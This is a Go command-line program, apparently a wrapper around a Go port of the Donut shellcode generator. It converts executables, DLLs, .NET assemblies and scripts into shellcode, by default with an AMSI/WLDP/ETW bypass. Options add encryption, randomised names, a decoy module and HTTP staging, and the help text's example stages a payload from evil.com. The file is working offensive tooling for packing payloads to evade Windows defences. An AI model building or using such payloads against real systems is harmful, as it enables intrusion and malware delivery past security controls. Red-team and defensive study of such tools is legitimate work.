package main

import (
	"flag"
	"fmt"
	"os"
	"strings"

	"github.com/gubarz/go-donutng/donut"
)

func main() {
	// Input/Output
	inputFile := flag.String("i", "", "Input file (PE/DLL/.NET/VBS/JS)")
	outputFile := flag.String("o", "payload.bin", "Output file")

	// Architecture - default to x84 (dual-mode, auto-detect at runtime)
	arch := flag.Int("a", donut.DONUT_ARCH_X84, "Target architecture:\n\t-1=Any (scripts)\n\t1=x86\n\t2=x64\n\t3=x86+x64")

	// Module options
	bypass := flag.Int("b", donut.DONUT_BYPASS_CONTINUE, "AMSI/WLDP/ETW bypass:\n\t1=None\n\t2=Abort on fail\n\t3=Continue on fail")
	headers := flag.Int("k", donut.DONUT_HEADERS_OVERWRITE, "PE headers:\n\t1=Overwrite\n\t2=Keep")
	compress := flag.Int("z", donut.DONUT_COMPRESS_NONE, "Compression:\n\t1=None\n\t2=aPLib\n\t3=LZNT1\n\t4=Xpress")
	entropy := flag.Int("e", donut.DONUT_ENTROPY_DEFAULT, "Entropy:\n\t1=None\n\t2=Random names\n\t3=Random+encrypt")
	format := flag.Int("f", donut.DONUT_FORMAT_BINARY, "Output format:\n\t1=Binary\n\t2=Base64\n\t3=C\n\t4=Ruby\n\t5=Python\n\t6=PowerShell\n\t7=C#\n\t8=Hex\n\t9=UUID")
	exitOpt := flag.Int("x", donut.DONUT_OPT_EXIT_THREAD, "Exit method:\n\t1=Thread\n\t2=Process\n\t3=Block")
	oep := flag.Uint("y", 0, "OEP offset for thread execution")
	thread := flag.Bool("t", true, "Run entrypoint as thread")

	// .NET options
	runtime := flag.String("r", "", "CLR runtime version (e.g., v4.0.30319)")
	domain := flag.String("d", "", "AppDomain name for .NET")
	class := flag.String("c", "", "Class name for .NET DLL")
	method := flag.String("m", "", "Method/function name")
	args := flag.String("p", "", "Parameters/arguments")
	unicode := flag.Bool("w", false, "Pass params as unicode")

	// HTTP staging
	server := flag.String("s", "", "HTTP server for staging")
	auth := flag.String("u", "", "HTTP auth (user:pass)")

	// Decoy
	decoyPath := flag.String("j", "", "Decoy module path")

	// Help
	help := flag.Bool("h", false, "Show help")

	flag.Parse()

	if *help || *inputFile == "" {
		fmt.Println("Usage: go-donut -i <input> [options]")
		fmt.Println("\nOptions:")
		flag.PrintDefaults()
		fmt.Println("\nExamples:")
		fmt.Println("  go-donut -i payload.exe")
		fmt.Println("  go-donut -i payload.exe -o loader.bin -a 2 -f 3")
		fmt.Println("  go-donut -i managed.dll -c MyNamespace.MyClass -m RunMe")
		fmt.Println("  go-donut -i native.dll -m DllMain -p \"arg1 arg2\"")
		fmt.Println("  go-donut -i payload.exe -s https://evil.com/payload")
		os.Exit(0)
	}

	// Build config
	config := donut.DefaultConfig()
	config.Input = *inputFile
	config.Output = *outputFile
	config.Arch = donut.DonutArchFromInt(*arch)
	config.Bypass = *bypass
	config.Headers = *headers
	config.Compress = uint32(*compress)
	config.Entropy = *entropy
	config.Format = uint32(*format)
	config.ExitOpt = *exitOpt
	config.OEP = uint32(*oep)
	if *thread {
		config.Thread = 1
	} else {
		config.Thread = 0
	}
	config.Runtime = *runtime
	config.Domain = *domain
	config.Class = *class
	config.Method = *method
	config.Parameters = *args
	if *unicode {
		config.Unicode = 1
	}
	config.Server = *server
	config.Auth = *auth
	config.Decoy = *decoyPath

	// Set instance type
	if *server != "" {
		config.InstType = donut.DONUT_INSTANCE_URL
	} else {
		config.InstType = donut.DONUT_INSTANCE_PIC
	}

	// Print info
	fmt.Printf("Input      : %s\n", config.Input)
	fmt.Printf("Output     : %s\n", config.Output)
	fmt.Printf("Arch       : %s\n", archToString(config.Arch.ToInternal()))
	fmt.Printf("Bypass     : %s\n", bypassToString(config.Bypass))
	fmt.Printf("Entropy    : %s\n", entropyToString(config.Entropy))
	fmt.Printf("Format     : %s\n", formatToString(int(config.Format)))
	fmt.Printf("Exit       : %s\n", exitToString(config.ExitOpt))
	if config.Class != "" {
		fmt.Printf("Class      : %s\n", config.Class)
	}
	if config.Method != "" {
		fmt.Printf("Method     : %s\n", config.Method)
	}
	if config.Parameters != "" {
		fmt.Printf("Args       : %s\n", config.Parameters)
	}
	if config.Server != "" {
		fmt.Printf("Server     : %s\n", config.Server)
	}
	fmt.Println(strings.Repeat("-", 50))

	// Generate shellcode
	err := donut.DonutCreate(config)
	if err != nil {
		fmt.Fprintf(os.Stderr, "\n[!] Error: %v\n", err)
		os.Exit(1)
	}

	// Write output
	err = os.WriteFile(config.Output, config.Pic, 0644)
	if err != nil {
		fmt.Fprintf(os.Stderr, "\n[!] Failed to write output: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("\n[+] Shellcode generated: %d bytes\n", config.PicLen)
	fmt.Printf("[+] Saved to: %s\n", config.Output)

	// Cleanup
	donut.DonutDelete(config)
}

func archToString(a int) string {
	switch a {
	case donut.DONUT_ARCH_ANY:
		return "Any"
	case donut.DONUT_ARCH_X86:
		return "x86"
	case donut.DONUT_ARCH_X64:
		return "x64"
	case donut.DONUT_ARCH_X84:
		return "x86+x64"
	default:
		return "Auto-detect"
	}
}

func bypassToString(b int) string {
	switch b {
	case donut.DONUT_BYPASS_NONE:
		return "None"
	case donut.DONUT_BYPASS_ABORT:
		return "Abort on fail"
	case donut.DONUT_BYPASS_CONTINUE:
		return "Continue on fail"
	default:
		return "Unknown"
	}
}

func entropyToString(e int) string {
	switch e {
	case donut.DONUT_ENTROPY_NONE:
		return "None"
	case donut.DONUT_ENTROPY_RANDOM:
		return "Random names"
	case donut.DONUT_ENTROPY_DEFAULT:
		return "Random + Encrypt"
	default:
		return "Unknown"
	}
}

func formatToString(f int) string {
	switch f {
	case donut.DONUT_FORMAT_BINARY:
		return "Binary"
	case donut.DONUT_FORMAT_BASE64:
		return "Base64"
	case donut.DONUT_FORMAT_C:
		return "C"
	case donut.DONUT_FORMAT_RUBY:
		return "Ruby"
	case donut.DONUT_FORMAT_PYTHON:
		return "Python"
	case donut.DONUT_FORMAT_POWERSHELL:
		return "PowerShell"
	case donut.DONUT_FORMAT_CSHARP:
		return "C#"
	case donut.DONUT_FORMAT_HEX:
		return "Hex"
	case donut.DONUT_FORMAT_UUID:
		return "UUID"
	default:
		return "Unknown"
	}
}

func exitToString(e int) string {
	switch e {
	case donut.DONUT_OPT_EXIT_THREAD:
		return "Thread"
	case donut.DONUT_OPT_EXIT_PROCESS:
		return "Process"
	case donut.DONUT_OPT_EXIT_BLOCK:
		return "Block"
	default:
		return "Unknown"
	}
}
